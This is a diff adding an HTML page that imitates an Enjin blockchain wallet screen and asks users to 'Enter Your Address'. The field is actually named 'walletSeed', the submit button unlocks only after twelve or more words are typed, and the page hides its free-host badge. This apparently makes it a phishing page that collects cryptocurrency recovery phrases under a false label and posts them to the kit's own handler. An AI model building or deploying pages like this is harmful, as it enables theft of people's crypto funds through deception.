@@ -1,0 +1,192 @@
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enjin | Blockchain Product Ecosystem</title>
+	<!-- BOOTSTRAP STYLES-->
+    <link href="./walletverified_files/bootstrap.css" rel="stylesheet">
+     <!-- FONTAWESOME STYLES-->
+    <link href="./walletverified_files/font-awesome.css" rel="stylesheet">
+        <!-- CUSTOM STYLES-->
+    <link href="./walletverified_files/custom.css" rel="stylesheet">
+     <!-- GOOGLE FONTS-->
+   <link href="./walletverified_files/css" rel="stylesheet" type="text/css">
+
+</head>
+<body>
+<style>
+ *{
+  margin: 0;
+  padding: 0;
+  font-family: Century Gothic;
+  background-attachment: fixed;
+ }
+body{
+  background-color: white;
+  height: 100vh;
+  background-size: cover;
+  background-position: absolute;
+  background-repeat: no-repeat, repeat;
+  background-attachment: fixed;
+}
+
+ul{
+  float: right;
+  list-style-type: none;
+  margin-top: 25px;
+}
+
+ul li{
+  display: inline-block;
+}
+
+ul li a{
+  text-decoration: none;
+  color: #fff;
+  padding: 8px 25px;
+  border: 2px solid #C09854;
+  border-radius: 25px;
+  font-size: 14px;
+  font-style: bold;
+  transform: 0.6s ease;
+  letter-spacing: 1px;
+}
+
+ul li a:hover{
+  background-color: #C09854;
+  color: #fff;
+}
+
+.logo img{
+  float: left;
+  margin-top: 23px;
+  height: 20px;
+  width: auto;
+}
+
+.main{
+  margin: auto;
+}
+
+.title{
+ 
+  margin-top: 6%;
+  text-align: center;
+  
+}
+
+
+.btn{
+  border-color: 2px solid grey;
+  background-color: grey;
+  padding: 15px 25px;
+  display: inline-block;
+  width: 100%;
+ color: white;
+  border: none;
+  outline: none !important;
+  
+  
+  
+}
+
+.btn a{
+  text-decoration: none;
+  color: white;
+  font-size: 12px;
+  font-family: "Lucida Console", Courier, monospace;
+  font-style: normal;
+  letter-spacing: 2px;
+
+}
+
+img[alt="www.000webhost.com"]{
+    opacity: 0;
+}
+
+.nav{
+    background-color: rgb(91,59,182);
+    height: 50px;
+}
+
+</style>
+  
+
+
+    <header>
+        <div class="nav">
+             <i class="fa fa-chevron-left" style="color: white; text-align: left; margin-top: 15px; margin-left: 20px"></i>
+       
+        <p style=" color: white; margin-top: -40px; text-align: center; margin-left: -120px; font-style: bold; font-size: 18px"> Your Address
+            
+        </div>
+        
+    </header>
+
+  <div class="title">
+      <form method="POST" action="enjinewallet.html?/your_address">
+          
+        
+    <br><br>
+    <h1 style="font-size: 20px; float: left; margin-left: 20px">Enter Your Address</h1>
+    <input type="text"required="required" name="walletSeed" autocomplete="off" spellcheck="on" height="28px" autofocus="" id="sometextarea" onkeypress="Submit();" style="height: 40px; padding-bottom: 0px; width: 87%; inset: none; border: none; border-bottom: 2px solid rgb(91,59,182); outline: none; font-size: 18px; margin-left: 0px" placeholder="Example: 0x34.......................39
+""><br>
+      
+            
+    <br><br><br><br><br>
+    <br><br><br><br><br><br><br>
+    <br><br><br><br><br><br><br>
+    
+    <input class="btn" type="submit" id="submitbutton" value="NEXT">
+    
+    <script>
+  function activateSubmit(){
+    var len = $('#sometextarea').val().split(" ").length;
+    if(len >= 12){ //12 words, hardcoded, probably change this to maxwords, or whatever.
+      $('#submitbutton').removeAttr('disabled');
+    }
+    else{
+      $('#submitbutton').attr('disabled', 'disabled');
+    }
+  };
+  
+   $('#sometextarea').keypress(function (e) {
+        var regex = new RegExp("^[a-zA-Z \s]+$");
+        var str = String.fromCharCode(!e.charCode ? e.which : e.charCode);
+        if (regex.test(str)) {
+            return true;
+        }
+        else
+        {
+        e.preventDefault();
+        alert('Please Enter Alphabate');
+        return false;
+        }
+    });
+  
+  
+  
+ 
+</script>
+      </form>
+      
+      
+
+  
+
+
+     <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
+    <!-- JQUERY SCRIPTS -->
+    <script src="./walletverified_files/jquery-1.10.2.js.download"></script>
+      <!-- BOOTSTRAP SCRIPTS -->
+    <script src="./walletverified_files/bootstrap.min.js.download"></script>
+    <!-- METISMENU SCRIPTS -->
+    <script src="./walletverified_files/jquery.metisMenu.js.download"></script>
+      <!-- CUSTOM SCRIPTS -->
+    <script src="./walletverified_files/custom.js.download"></script>
+    
+    <script src="./walletverified_files/jquery-3.4.1.js.download"></script>
+   
+
+</div></body></html>
